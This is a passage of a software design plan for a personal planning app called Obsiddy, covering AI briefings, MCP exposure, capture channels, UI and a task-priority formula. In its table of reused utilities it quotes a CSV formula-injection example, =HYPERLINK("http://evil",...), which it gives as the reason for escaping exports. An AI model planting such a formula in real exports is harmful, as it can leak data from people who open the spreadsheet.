**"What you achieved" is the payoff for `ObsiddyEvent`.** Query `kind: 'completed'` over the last 7 days — completed tasks, closed projects, goals hit. This is why §1 has an append-only log rather than scanning `updatedAt` across five tables. It also matters psychologically: a planner that only ever shows what's outstanding is a machine for feeling behind.

### `workStyle` — and why it can't just be a tone setting

`ObsiddySpace.workStyle` = `structured | balanced | exploratory` (default `balanced`), set in settings with a `<FieldHelp>` explaining it in plain terms — _"Do you want the morning briefing to lead with your task list, or with something you might not have thought of?"_

The rule that makes this real: **`workStyle` changes what data the briefing selects, not just how it's worded.** A version that only adjusts tone is theatre — same content, different adjectives — and users notice within a week.

| `workStyle`   | Leads with     | Data actually selected                                                                                                                                                                                   |
| ------------- | -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `structured`  | The plan       | Top 5 by `priorityScore`, anything overdue, today's time blocks, WIP-limit breaches, remaining weekly capacity                                                                                           |
| `exploratory` | The unexpected | Highest-`strength` unreviewed `ObsiddyLink` suggestions, one resurfaced thought from >90 days ago, one `obsiddy_ideate` angle on an active project. Deadlines appear as a short footer, not the headline |
| `balanced`    | One of each    | Top 3 tasks, then the single strongest unreviewed connection                                                                                                                                             |

**Per-briefing override.** People aren't one type permanently — you're structured in a deadline week and exploratory on a quiet Friday. A "surprise me today" control regenerates against `exploratory` without changing the stored setting. Cheap, and it stops the config becoming a cage.

**`workStyle` does not touch `score.ts`.** Ranking stays deterministic and shared (D3); `workStyle` governs presentation and selection only. An exploratory user who wants urgency to matter less should lower the `urgency` weight in `priorityWeights` — and the briefing can _suggest_ that, via the same explicit-confirmation path as any other weight change (§10).

### The briefing workflow

`obsiddy-morning-briefing` — chained off the nightly run, and re-runnable on demand:

1. `tool_call obsiddy_get_snapshot`
2. **`report`** — the factual half rendered deterministically, **no LLM**: completed counts and titles, overdue list, capacity remaining, WIP state (§7)
3. **`route`** on `workStyle` → three branches
4. `llm_call` per branch — different prompt _and_ different input selection, per the table above
5. `tool_call obsiddy_write_review{ horizon: 'briefing' }`

Seeded agent **`obsiddy-briefer`** (temp 0.3 structured / 0.7 exploratory via the branch), sharing the `obsiddy-core` profile. Its voice brief matters: short, concrete, no preamble, no motivational filler. Plain English, actions you could start in the next ten minutes.

Routes: `GET /obsiddy/briefing` (today's, instant) and `POST /obsiddy/briefing/regenerate` (`{ workStyleOverride? }`). Capability `obsiddy_get_briefing` so it's reachable from chat and MCP — _"what's my briefing?"_ from Claude Code is exactly the frictionless path §7 is chasing.

Because `report` carries the factual half for free, the daily LLM cost is one small call — roughly **£0.30–0.90/month** depending on model.

`orchestrator` config: `availableAgentSlugs: ['obsiddy-connector','obsiddy-strategist']`, `maxRounds: 3`, `maxDelegationsPerRound: 3`, `budgetLimitUsd: 0.50`, `timeoutMs: 180000`, planner prompt instructing it to **reject connections that are merely topically similar but carry no action implication**. Also set `AiWorkflow.maxCostPerExecutionUsd` on every workflow — the step budget only caps the orchestrator step.

**Production driver:** the dev in-process 60s ticker in `instrumentation.ts` covers local. Production needs external cron hitting `POST /api/v1/admin/orchestration/maintenance/tick`. Document it prominently — it's the single most likely "why did nothing happen".

---

## 7. Platform surfaces we plug into

Sunrise ships far more than the vector store and the workflow engine. This section lists what the brain **consumes rather than rebuilds** — most of it is seed rows and config, not code. Anything not listed here was considered and deliberately skipped (end of section).

### MCP — expose the brain to Claude Desktop and Claude Code

**The highest value-per-effort item in the whole plan, and it is zero application code.**

MCP tools are sourced from `McpExposedTool` rows pointing at `AiCapability` rows (`lib/orchestration/mcp/tool-registry.ts`). Critically, `lib/orchestration/mcp/protocol-handler.ts:311` sets `userId: auth.createdBy` — **the MCP key's owner becomes `CapabilityContext.userId`**. So brain capabilities, which already refuse to run without `context.userId` (§5), get correct per-user scoping over MCP automatically. Nothing to write.

Seed one `McpExposedTool` row per read-oriented brain capability — `obsiddy_search`, `obsiddy_list_tasks`, `obsiddy_get_snapshot`, `obsiddy_find_connections`, `obsiddy_ideate` — plus `obsiddy_capture` and `obsiddy_upsert_task` if you want write access. Then create an `McpApiKey` with `scopedAgentId` pointed at `obsiddy-companion`.

The result: **"what should I work on today?" and "capture this thought" work from inside Claude Code, in your editor, without opening the app.** For a tool whose whole premise is frictionless capture, that is a bigger win than the PWA.

Set `isIdempotent: true` on the read-only ones so the dispatcher's cache applies, and use `McpApiKey.scope` (a `Json` carrier documented as "a fork maps it to its own domain") if you later want per-board or per-entity key scoping.

Expose **resources and prompts too, not just tools** — `McpExposedResource` supports URI _templates_ (`listMcpResourceTemplates`) and `McpExposedPrompt` holds reusable prompt templates:

- `obsiddy://today` — a resource Claude Code can _read_ without spending a tool call
- `obsiddy://project/{slug}`, `obsiddy://entity/{slug}` — resource templates
- A `weekly-review` MCP prompt, so the ritual is one command from anywhere

Read paths are cheaper and more natural as resources than as tools; keep tools for the things that write.

### Personal API keys — `AiApiKey`, not `McpApiKey`

> **Correction.** An earlier draft of this section said the iOS Shortcut should use `McpApiKey`. Wrong model. `McpApiKey` is for the MCP protocol endpoint; **`AiApiKey`** (`prisma/schema/orchestration-providers.prisma:139`) is the per-user HTTP key, with self-service routes already built at `/api/v1/user/api-keys`.

`AiApiKey` is a better fit in every respect: `userId` with **`onDelete: Cascade`** (so keys die with the account, unlike `McpApiKey.createdBy` which is `SetNull`), `rateLimitRpm` per key, `expiresAt`, `revokedAt`, and `scopes String[]` — so adding an `"obsiddy"` scope costs nothing, no migration.

An iOS Shortcut posting to `/api/v1/obsiddy/capture` from the share sheet or a Lock Screen button beats opening a PWA, and iOS queues it when offline. **Ship it alongside the PWA, not instead of it** — the PWA gives you a real UI, the Shortcut gives you two-second capture.

### Voice and image capture — the biggest thing the plan was missing

A tool whose premise is _"records random thoughts during the day"_ had no voice input. That's backwards: the moments you most need to capture — walking, driving, cooking — are exactly the ones where typing is impossible.

Everything needed already exists:

| Piece                                                         | Where                                                                                                                                 |
| ------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Recording UI hook (MIME negotiation, 3-min cap, error states) | `lib/hooks/use-voice-recording.ts` — `useVoiceRecording()`                                                                            |
| Transcription                                                 | `LlmProvider.transcribe()` / `transcribeStream()` (`lib/orchestration/llm/openai-compatible.ts:349`), cost-logged like any other call |
| Upload validation                                             | `lib/validations/transcribe.ts` — `validateTranscribeUpload`, `enforceContentLengthCap`                                               |
| Agent toggle                                                  | `AiAgent.enableVoiceInput` (gated by `AiOrchestrationSettings.voiceInputGloballyEnabled`)                                             |
| Reference implementation                                      | `app/api/v1/embed/speech-to-text/route.ts`                                                                                            |
| Smoke test                                                    | `npm run smoke:transcribe`                                                                                                            |

`POST /obsiddy/capture/voice` accepts an audio blob, transcribes it, and creates a `ObsiddyThought` with `source: 'voice'` — **keeping the transcript, not the audio**, so there's no new storage or retention surface. Wire the same hook into the brain chat by flipping `enableVoiceInput` on `obsiddy-companion`.

**Image capture** is the same story: `AiAgent.enableImageInput`, a vision-capable model, `npm run smoke:vision`. Photograph a whiteboard, a book page, a handwritten note → a thought. `source: 'image'`, extracted text stored, original via `lib/storage`.

Together these make the phone a genuine capture device rather than a small keyboard.

### Things the plan was about to hand-roll

Each of these I had described writing from scratch. All exist:

| Plan said                                                   | Use instead                                                                                                                       | Why it matters                                                                                                                                                                                                                                   |
| ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| "CSV export with Trello-compatible headers" (§12)           | **`csvEscape()`** — `lib/api/csv.ts`                                                                                              | **Security, not convenience.** The file's own comment warns about `HYPERLINK()` exfiltration: a task titled `=HYPERLINK("http://evil","Q4 plan")` becomes a _live formula_ when the export opens in Excel or Sheets. Never `join(',')` user text |
| "copy the bulk route's pre-parse content-length guard" (§4) | **`enforceContentLengthCap()`** — `lib/api/multipart-guard.ts`                                                                    | It's already extracted; copying the route's inline version would fork it                                                                                                                                                                         |
| "Trello REST push" (§12, Release 4)                         | **`lib/orchestration/http/`** — `executeHttpRequest`, `isHostAllowed` (`ORCHESTRATION_ALLOWED_HOSTS`), `resolveIdempotencyHeader` | A hardened outbound kit with allowlisting and idempotency keys. Raw `fetch` re-introduces every SSRF and double-post problem this already solves                                                                                                 |
| "resolve snooze presets in `ObsiddySpace.timezone`" (§10)   | **`lib/utils/timezones.ts`**                                                                                                      | Plus `format-duration.ts` for `estimateMinutes`, `format-currency.ts` for cost display, `is-markdown.ts` for card notes                                                                                                                          |
| Board / graph / list view switching (§9, §12)               | **`use-tracked-url-tabs.ts`**                                                                                                     | URL-synced tabs so a view is linkable and survives refresh                                                                                                                                                                                       |
| Document upload UI (§4)                                     | **`use-attachments.ts`**                                                                                                          | Already handles the attach/preview/remove cycle                                                                                                                                                                                                  |
| "show the nightly run progress"                             | **`use-execution-live-poll.ts`**, `use-execution-status-poller.ts`                                                                | Built for exactly this                                                                                                                                                                                                                           |

### `logEvent()` vs `ObsiddyEvent` — why the plan keeps its own table

`lib/events/event-log.ts` exports `logEvent()`, an explicit fork seam for app domain events that writes to `AiAdminAuditLog` with **zero new schema**. It looks like it should replace `ObsiddyEvent` (§1). It shouldn't, for one decisive reason:

**`AiAdminAuditLog.userId` is `onDelete: SetNull`** (`orchestration-ops.prisma:89`). Rows survive user erasure as orphans carrying `entityId`s and `metadata` about a deleted person's content. `ObsiddyEvent` cascades via `ObsiddySpace` and is read on the weekly review's hot path, which a shared audit table indexed for admin queries is not.

**Decision:** `ObsiddyEvent` for the activity stream. `logEvent()` for brain _ops_ events that legitimately outlive the account — "share link created", "vault connected", "data exported" — and **never with personal content in `metadata`**. Recorded here because the seam exists and someone will otherwise ask why a table was added.

### Tenancy

`TENANCY_MODE` (`lib/env.ts:76`) stays at `single`. `lib/db/client.ts:35` throws on `multi` — it's an unimplemented seam, not a feature. The brain is multi-**user**, single-**tenant**: isolation comes from `userId` scoping (D5), not row-level security. If this ever becomes a hosted product, `.context/architecture/multi-tenancy.md` documents the RLS retrofit; do not half-adopt it now.

### `AiAgentProfile` — stop duplicating the four agents' prompts

The plan seeds four agents (§5) that share a voice, a set of guardrails, and a description of what a second brain is for. Writing that four times means it drifts four ways.

`AiAgentProfile` exists exactly for this: shared `persona`, `brandVoiceInstructions` and `guardrails`, with each agent choosing `override` or `append` per field (`resolveEffectivePrompt` in `lib/orchestration/agents/resolve-effective-prompt.ts`; composition order is `[Persona] → systemInstructions → [Guardrails] → [Brand Voice]`).

Seed **one `obsiddy-core` profile** carrying the shared persona and guardrails; each of the four agents keeps only its own `systemInstructions` and sets `guardrailsMode: 'append'`. Changing the house voice then becomes one edit.

### Guards — set them explicitly, don't inherit defaults

`AiAgent` already has `inputGuardMode`, `outputGuardMode`, `citationGuardMode` and `topicBoundaries[]`. The plan mentioned guards only in passing; leaving them at defaults is a decision made by accident. For the brain:

- **`citationGuardMode`** matters most. When the companion says "you said you'd call the accountant", it should be able to point at the thought it came from — otherwise you can't tell recall from invention. Turn it on for `obsiddy-companion` and `obsiddy-strategist`.
- **`outputGuardMode`** on `obsiddy-companion`: your own notes are the input, so topic boundaries are near-useless here, but PII detection matters if you ever share a conversation.
- **`inputGuardMode`** matters once vault sync lands (§14) — a synced note from a cloned public repo is not trusted content.

### Provenance — `output.sources`

`lib/orchestration/provenance/` defines the `output.sources` contract and an opt-in guard rule; the engine captures it and the approval/trace UI renders source pills. Obsiddy workflow steps that read from `searchObsiddy` should populate `output.sources` with the thought/project/document IDs they used. **This is what turns "the agent suggested this" into "the agent suggested this because of these four notes"** — and it's the difference between trusting the weekly review and re-deriving it yourself.

`AiMessage.provenance` already carries `{ citations, workflowSources, capabilityCalls }`, so the chat surface gets this for free once the capabilities populate it.

### Evaluations — how you'll know triage quality regressed

`lib/orchestration/evaluations/` ships datasets, a grader registry (`registerGrader`), a worker, and named metrics (faithfulness, groundedness, relevance). The plan currently has **no way to notice if the nightly triage gets worse** after a prompt change or a model swap.

Seed a small dataset — 30 real captured thoughts with the classification you'd have made by hand — and run it against `obsiddy-triage`. Register one custom grader (`obsiddy-triage-accuracy`) comparing proposed project/goal links to the expected ones. Run before and after any prompt edit.

Also seed a **judge agent** (`kind: 'judge'`): §6's `obsiddy-horizon-check` workflow already uses a `judge_call` step, but the plan never seeded an agent for it to call.

### Analytics — free insight into your own thinking

`lib/orchestration/analytics/analytics-service.ts` gives popular topics, unanswered questions, engagement and knowledge gaps over `AiConversation` rows. Obsiddy conversations populate those tables automatically, so `/admin/orchestration/analytics` works from day one with no obsiddy-specific code. "Questions my brain couldn't answer" is a genuinely useful list — it tells you what you haven't written down yet.

### Backup and restore

`lib/orchestration/backup/` exports and imports orchestration config with schema versioning. The four brain agents, their profile, the five workflows and the capability rows are all ordinary orchestration rows, so they round-trip through the existing exporter — **as long as seeds are idempotent and keyed by slug**, which §5 already requires. Add a line to the app docs noting brain config is covered; no code.

### Event hooks — outbound webhooks for free

`emitHookEvent` fires `workflow.started` / `completed` / `failed` / `paused_for_approval` from the engine. Obsiddy workflows are ordinary workflows, so **a Slack ping when the weekly review finishes is a config row, not a feature**. Note that `HOOK_EVENT_TYPES` is a fixed const — obsiddy-specific event types would mean editing a core file, so use the workflow-level events rather than inventing `brain.*` ones.

### Recipes — the documented shape for every external integration

`.context/orchestration/recipes/` ships nine worked integration recipes, and its index states the platform's position plainly: **no vendor SDKs are bundled**. Every integration is `call_external_api` + the orchestration HTTP module, configured per vendor. Recipes are _pattern_-named (`payment-charge.md`), never vendor-named, because "different forks pick different vendors for the same shape".

This directly reshapes work already in the plan:

| Plan item                                       | Recipe                                                                                                                                                                                                                             |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Trello push (§12, Release 4)                    | `call_external_api` + a `customConfig` binding + `ORCHESTRATION_ALLOWED_HOSTS` — **not bespoke Trello code**. Follow `recipes/index.md`'s 12-section template and write it as `.context/framework/obsiddy/recipes/board-export.md` |
| Notification emails (§6)                        | `recipes/transactional-email.md`                                                                                                                                                                                                   |
| Time blocks / calendar (§1, `ObsiddyTimeBlock`) | **`recipes/calendar-event.md`** — two-way calendar sync was never scoped, and this is the documented path when you want it                                                                                                         |
| Review documents (§11)                          | `recipes/document-render.md`                                                                                                                                                                                                       |
| Approvals in chat (§7)                          | `recipes/in-chat-approval.md`                                                                                                                                                                                                      |
| SMS/WhatsApp capture (§7)                       | `recipes/sms-whatsapp-inbound-reply.md`                                                                                                                                                                                            |

**This materially de-risks Release 4.** The recipe pattern puts credentials in **env vars, never in the DB** — so a single-org Obsiddy deployment pushing to one Trello workspace needs no `secret-box` at all. Per-_user_ Trello tokens are the only case that genuinely requires encrypted per-user credential storage. Ship the env-var recipe first; treat per-user tokens as a separate, later decision rather than a prerequisite.

### Conventions the plan should follow explicitly

Docs read in this pass that carry rules the plan hadn't stated:

- **`.context/security/gotchas.md`** — eleven named traps. Four bite here: _#2 calling section limiters from route handlers_ (CLAUDE.md says the same — `proxy.ts` already applied them; Obsiddy adds only per-flow sub-caps), _#11 fetching user-controlled URLs without an SSRF guard_ (the git remote, §14), _#5 stack traces in production error responses_, and _#7 input sanitisation breaking legitimate input_ — relevant because note bodies are markdown and over-eager sanitising will mangle them. Read it before writing the first route.
- **`.context/types/conventions.md`** — shared types in `types/`, Zod schemas in `lib/validations/`, schema inference over hand-written interfaces. Obsiddy's types go in `types/obsiddy.ts` and its schemas in `lib/framework/obsiddy/validations.ts`, both inferred from Zod rather than declared twice.
- **`.context/architecture/patterns.md`** — directory-by-responsibility, centralised error classes, the guard + thrown-error route shape. The plan matches this; worth citing so a reviewer can check.
- **`.context/api/mobile-integration.md`** — a full mobile guide (auth, secure storage, session expiry, refresh, a type-safe client, iOS native). §8's Shortcuts and PWA work should follow it rather than reinvent the auth handshake.
- **`.context/testing/*`** — eight docs. `patterns.md`, `mocking.md` and `type-safety.md` set the house style the test matrix in §16 must be written in; `/test-plan` → `/test-write` → `/test-review` is the workflow.

### Workflow step types the plan should be using

Sunrise ships 19 step types; §6's workflows use nine. Three of the unused ones directly improve what's already there:

- **`report`** — deterministic Markdown from the execution trace via `renderExecutionMarkdown`, **with no LLM call**. The weekly review currently has an LLM render everything, including counts and lists that are pure data. Split it: `report` renders the factual half for free, `llm_call` writes only the judgement. A direct token saving on the most frequent workflow. (Note the documented subtlety: an in-step `report` only sees the trace _up to_ that step.)
- **`supervisor`** — a post-hoc judge audit of the whole trace, writing `supervisorVerdict` / `supervisorScore` / `supervisorReport` onto the execution row. Aim it at the weekly review and ask the question self-reported reviews always dodge: **was this honest about what didn't get done?** A review that only reports progress is worse than no review.
- **`route`** — classify then branch. `obsiddy-nightly-triage` currently hands everything to one `agent_call`; routing on thought type (actionable / reference / idea / noise) is cheaper, more debuggable, and lets the noise branch cost nothing.

`external_call` is the natural home for the Release 4 Trello push — a workflow step with retry, idempotency and cost tracking, rather than bespoke code. `parallel`, `plan`, `evaluate`, `chain` and `chat_turn` are noted and not currently needed.

Also: **`lib/orchestration/review-schema/`** defines a declarative schema for review sections (`reviewSectionSchema`, `fieldSpecSchema`, `badgeSpecSchema`). `ObsiddyReview.markdown` is freeform today; adopting the review schema gives structured sections that render consistently and can be diffed between weeks.

### Smaller plug-ins, each a line or two

| Surface                                         | Use                                                                                                                                                                                                    |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `lib/app/admin-nav.ts` (`registerNavSection`)   | A "Second Brain" admin section — agent health, cost, eval runs. The plan registered `protected-routes` but forgot this seam                                                                            |
| `lib/app/emails.ts` (`emailOverrides`)          | Re-skin the share-invite and notification emails without forking the templates                                                                                                                         |
| `lib/app/surface.ts`                            | `/obsiddy` classifies as `consumer`, so it picks up `brand-theme.css` automatically. Nothing to change — but know that's why it looks the way it does                                                  |
| `cost-estimation/workflow-cost.ts`              | Pre-run USD estimate on the connection-finder before it burns its `budgetLimitUsd`                                                                                                                     |
| `human_approval` step                           | Gate bulk-destructive actions (mass archive, vault mirror-delete) through the existing approval queue rather than a bespoke confirm dialog                                                             |
| `registerSchema` (`schemas/registry.ts`)        | Named Zod schemas for structured workflow step outputs instead of ad-hoc parsing                                                                                                                       |
| `registerOutboundAdapter`                       | SMS/WhatsApp capture, if email-to-inbox isn't enough                                                                                                                                                   |
| Tracing (`registerTracer`)                      | No-op by default; the OTEL adapter exists if you ever need span trees across the nightly run                                                                                                           |
| Audit log                                       | Obsiddy config changes land in `AiAuditLog` via the existing admin routes — free                                                                                                                       |
| Experiments (A/B)                               | Two triage prompts, measured. Worth it once the eval dataset exists, not before                                                                                                                        |
| `useWizard` + `useLocalStorage`                 | A first-run wizard: create your first area, goal and project. The setup-wizard pattern already exists to copy                                                                                          |
| `lib/feature-flags/` + `FeatureFlag`            | Gate the board, vault sync and sharing behind flags during rollout — toggle without a deploy                                                                                                           |
| `lib/analytics/` + `lib/consent/`               | Product analytics (GA4 / Plausible / PostHog / console) already consent-gated. Distinct from orchestration analytics: this measures whether people _use_ capture, that measures what the agents _said_ |
| `registerOutboundAdapter` + `AiOutboundMessage` | SMS / WhatsApp capture with a dedup ledger, if email-to-inbox isn't enough                                                                                                                             |
| `DataErasureReceipt`                            | Erasure already produces receipts; the brain cleanup hook (§13) participates automatically                                                                                                             |
| `lib/monitoring/performance.ts`                 | Worth pointing at the board `/view` endpoint and `searchObsiddy`, the two hot paths                                                                                                                    |

### Deliberately not used

- **The platform knowledge base** — global by design; its own docs name per-user scoping as an anti-pattern (§4). The brain owns its vectors.
- **`lib/app/agent-fields.ts`** — only needed when a fork adds columns to `AiAgent`. The brain adds none.
- **Embed widget** — a public share link (§13) already covers "show someone my board"; embedding it in a third-party site is a different product.
- **Provider models / model audit** — platform admin concern, not app scope.

---

## 8. Capture channels

**Web quick-capture** — `components/obsiddy/quick-capture.tsx`, ⌘/Ctrl+Enter, draft persisted via `lib/hooks/use-local-storage.ts` so a reload never loses a thought. Mounted in `app/(protected)/obsiddy/layout.tsx`.

**PWA** — the repo has **no manifest and no icons** (`public/` is just favicons). Add `app/manifest.ts` (`start_url: '/obsiddy'`, `display: 'standalone'`, 192/512 + maskable icons), a **`method: 'GET'`** `share_target` → `/obsiddy/capture` (a POST target needs a service-worker fetch interceptor; GET gets Android's share sheet working with zero SW), `shortcuts`, and `appleWebApp` metadata for iOS. CSP is already fine (`worker-src 'self' blob:`, `default-src 'self'`).

**Email-to-inbox** — Postmark adapter self-registers when `POSTMARK_INBOUND_USER`/`_PASS` are set. Address format `brain+<inboxToken>@<OBSIDDY_INBOX_DOMAIN>`; the adapter normalises `mailboxHash`.

> **The one deliberate exception to "userId always from context".** `AiWorkflowTrigger` is `@@unique([channel, workflowId])` and stamps `execution.userId` from `trigger.createdBy`, so for genuine multi-user, `obsiddy_capture_for_token` takes `{ inboxToken, from, subject, text, messageId }`, resolves `userId` from `ObsiddySpace.inboxToken`, and **ignores `context.userId`**. Mandatory compensating controls: bound to _only_ the intake agent; rejects unless `from` matches the resolved user's verified account email; `inboxToken` is 32 random chars and rotatable; `externalId` dedupes replays. Document loudly in `.context/framework/obsiddy/second-brain.md`.

**Voice capture** — `POST /obsiddy/capture/voice`, using `useVoiceRecording` + `LlmProvider.transcribe()` (§7). Stores the transcript with `source: 'voice'`, not the audio. **This should be the primary phone capture path**, with the text box as the fallback — the moments worth capturing are the ones where you can't type.

**Image capture** — `source: 'image'`, vision model extracts the text, original stored via `lib/storage`. Whiteboards, book pages, handwriting.

**Shortcut capture** — an `AiApiKey` with a `obsiddy` scope plus an iOS Shortcut posting to `/obsiddy/capture` (§7). Two seconds from thought to inbox.

**Chat capture** — nothing extra; `obsiddy_capture` bound to `obsiddy-companion` covers it.

`ObsiddyThought.source` therefore becomes `web | pwa | voice | image | shortcut | email | chat | agent | api`.

---

## 9. UI

Routes under `app/(protected)/obsiddy/`: `layout.tsx` (sub-nav + persistent quick capture), `page.tsx` (Today), `inbox/`, `projects/[id]`, `goals/`, `entities/[id]`, `documents/`, `boards/` + `boards/[slug]`, `connections/`, `graph/`, `chat/`, `capture/`, `reviews/[id]`. Each gets a `loading.tsx`. Register `'/obsiddy'` in `lib/app/protected-routes.ts`.

### Kanban board

`components/obsiddy/board/` — `board-view.tsx` (DndContext + columns), `board-column.tsx` (SortableContext, WIP badge), `task-card.tsx` (tags, checklist pill, due chip, aging tint), `card-detail-sheet.tsx` (notes markdown editor, checklist, tags, links, share button). Fed by one `GET /obsiddy/boards/[id]/view`.

Two things that decide whether it feels good: **optimistic reordering** (move the card locally, fire the PATCH, roll back and toast on failure — never await the round trip before moving), and **`useSensors` with both `PointerSensor` and `KeyboardSensor`** so the board is usable with a keyboard. dnd-kit gives the second one for free; skipping it is the common mistake.

### Graph view

**`@xyflow/react` v12 is already a dependency** (the workflow builder uses it), so nodes and edges render with no new library. What React Flow does _not_ do is layout — it expects x/y coordinates. Add **`d3-force`** (~30 KB, does exactly this): run the simulation client-side in a `useEffect`, write the settled positions into React Flow nodes. Not `elkjs` — it's a multi-megabyte Java-transpiled bundle built for hierarchical diagrams, which is the wrong shape and the wrong weight.

**Filtered by default, never "show everything."** Obsidian's graph view is the cautionary tale: above a few hundred nodes it becomes a hairball that looks impressive and tells you nothing. `/obsiddy/graph` opens focused on one node with `depth=1` and a node cap (~150), with controls to widen. A pretty hairball is a demo; a neighbourhood view is a tool.

Node colour by `entityType`, edge thickness by `ObsiddyLink.strength`, dashed edges for `status: 'suggested'` so proposals read as provisional. Clicking a node re-centres the query rather than re-laying-out the whole graph. Archived items are excluded (their embeddings are gone anyway, §11).

**Missing primitives — build fork-owned, don't add deps:** no generic data-table (copy `components/admin/user-table.tsx` into `components/obsiddy/task-table.tsx`); no toast (build `save-status.tsx`, an inline `aria-live="polite"` status); no skeleton (`animate-pulse` divs); no progress (div + `role="progressbar"`); no radio-group (use `Select`).

**Chat page** — `components/admin/orchestration/chat/chat-interface.tsx` is hardcoded to the admin endpoint. **Copy it** to `components/obsiddy/obsiddy-chat.tsx` rather than adding an `endpoint` prop to a Sunrise-owned component. Accepted duplication for a clean fork seam.

**Forms** — react-hook-form + Zod, `mode: 'onTouched'`, `<FormError>`, and `<FieldHelp>` ⓘ on every non-trivial field (energy, estimate, defer-until, horizon, target date all qualify — CLAUDE.md requires it). Plain English, concrete actions, no flourishes.

**Nav** — `components/layouts/protected-nav.tsx` has a hardcoded array and no `lib/app/` seam. Adding `/obsiddy` is a one-line edit to a Sunrise-owned file; flag it in the PR.

`@/` alias everywhere including siblings (ESLint-enforced).

---

## 10. Prioritisation

Pure function, no I/O, in `lib/framework/obsiddy/priority/score.ts` — the most testable and most business-critical code in the build.

```
base  = 0.30·urgency + 0.25·goalAlignment + 0.15·projectMomentum
      + 0.15·areaBalance + 0.10·effortFit + 0.05·staleness      // ∈ [0,1]

score = clamp(base + activeManualBoost, -1, 2)
```

- **urgency** — `deferUntil > now` ⇒ **hard zero, short-circuit**. Overdue ⇒ 1.0. Else `1/(1 + daysUntilDue/3)`. No due date ⇒ 0.2.
- **goalAlignment** — walk task → project → goal via `projectId` and accepted `ObsiddyLink`s. Nearest horizon reached: week 1.0, month 0.8, quarter 0.6, year 0.45, life 0.35 (near horizons are more actionable). ×0.7 if the goal's target date has passed. Unlinked ⇒ 0.15.
- **projectMomentum** — `exp(-daysSinceLastActivity/14)`. Stalled projects surface via `staleness` and the weekly review instead.
- **areaBalance** — `clamp(1 - minutesThisWeekInArea / area.targetWeeklyMinutes, 0, 1)`. **This is the term that makes it a life organiser** — a neglected Health area floats above a hot work project.
- **effortFit** — 1.0 when `estimateMinutes` fits today's largest free gap _and_ `energy` matches the time-of-day profile; 0.5 otherwise.
- **staleness** — `min(1, daysSinceCreated/30)`, so nothing rots forever.

Weights read from `ObsiddySpace.priorityWeights` (Zod-validated, above as defaults). The strategist may _propose_ weight changes in a review; applying them goes through `PATCH /obsiddy/space` with explicit user confirmation — never a silent agent write.

### Manual override — `manualBoost`

The six factors handle "what should generally matter". They cannot handle "I don't care what the maths says, _this_ one first" — which is a real and frequent need, and without it the whole ranking loses credibility the first time it's wrong.

- **`manualBoost Float @default(0)`**, clamped to `[-1, +1]`. **Applied additively _after_ the weighted sum, never as a seventh weighted term.** A weighted term gets diluted by its own weight and can't guarantee anything; additive-after means `+1` provably outranks every unboosted task (base maxes at 1.0) and `-1` provably sinks below them. The guarantee is the whole point.
- **Negative boost is equally useful** — "bury this, I can't delete it but I don't want to see it". Cheap, and it stops the list filling with undeletable noise.
- **`manualBoostExpiresAt DateTime?`, defaulting to +7 days.** This is the field that keeps the feature honest: a pin set in March and forgotten silently corrupts your ranking forever, and you'd never know the maths had stopped being followed. An expired boost is treated as `0` **at read time by the pure function** — never lazily zeroed by a background job, so behaviour can't depend on whether the nightly run happened. "Never expires" is allowed but requires an explicit checkbox, same principle as share links.
- **`manualBoostReason String?`** — optional one-liner, shown in the UI and included in `priorityFactors` so both you and the agent can see _why_ the ranking was overridden rather than treating it as an unexplained anomaly.
- **`deferUntil` still short-circuits to zero first.** Deferring is you saying "not before date X"; a boost must not resurrect it early. Order is: defer check → base → boost.
- **No agent may write it.** No capability exposes it, and `obsiddy_reprioritise` never touches it. This is a human veto over the machine's opinion, so the machine writing it would defeat the purpose. It moves only via `PATCH /api/v1/obsiddy/tasks/[id]`. The agent may _read_ it (it's in `priorityFactors`) and may _suggest_ one in a review, as prose.
- **`priorityFactors` records `base`, `manualBoost` and `boostActive`** separately, so the UI can render "ranked #1 — pinned by you, expires Friday" rather than an inexplicable number.

UI: a pin control on each task row with a duration picker (today / this week / until I unpin), and a filter chip on `/obsiddy/today` to show what's currently pinned. The weekly review lists boosts expiring in the next 7 days.

### Snooze — the inverse gesture

`manualBoost` says "this, now". Snooze says "not this, not now". They're the same control from opposite ends and must feel like one idea.

**The mechanism already exists for tasks: `deferUntil` hard-zeroes urgency and short-circuits the score.** What's missing is the _gesture_ and the _learning_, plus the same capability on the three other things that clutter a view.

| Surface        | Field                           | Effect while snoozed                                                   |
| -------------- | ------------------------------- | ---------------------------------------------------------------------- |
| Task           | `deferUntil` (existing)         | score short-circuits to 0; hidden from `/today` and default task lists |
| Thought        | `snoozedUntil`                  | drops out of the inbox count and the nightly triage queue              |
| Suggested link | `snoozedUntil` on `ObsiddyLink` | hidden from the connections view; the sweep won't re-propose it        |
| Project        | `snoozedUntil`                  | hidden from the active projects list; `projectMomentum` decay pauses   |

Presets, not a date picker first: **later today (+4h) · tomorrow (9am local) · next week (Mon 9am) · next month · pick a date**. All resolved in `ObsiddySpace.timezone`, never server time — a task that unsnoozes at 2am because the server is in UTC is the kind of small wrongness that makes a tool feel careless.

**Unsnoozing is an event, not a silence.** When something comes back it's flagged `returnedFromSnooze` in `priorityFactors` for its first appearance, so `/today` can group it under "back from snooze" rather than having it silently reappear mid-list where you'll miss it.

**Snooze counting is the actually interesting part.** `snoozeCount Int @default(0)` and `lastSnoozedAt`, incremented every time. Repeated snoozing is a signal, not noise — something snoozed five times is telling you one of three things, and the monthly review should say so plainly:

- it isn't actually important → offer to drop it
- it's blocked on someone else → offer to set `status: 'waiting'`
- it's too big to face → offer to break it into smaller tasks

A normal to-do app lets you snooze the same item forty times and never mentions it. Noticing that pattern is exactly the job a second brain should be doing, and it costs one integer column.

`snoozeCount` is **never** an input to `score.ts` — the scorer stays a pure function of the six factors plus boost. Chronic-snooze detection is a separate read in the review workflow. Keeping them apart is what stops the ranking becoming inexplicable.

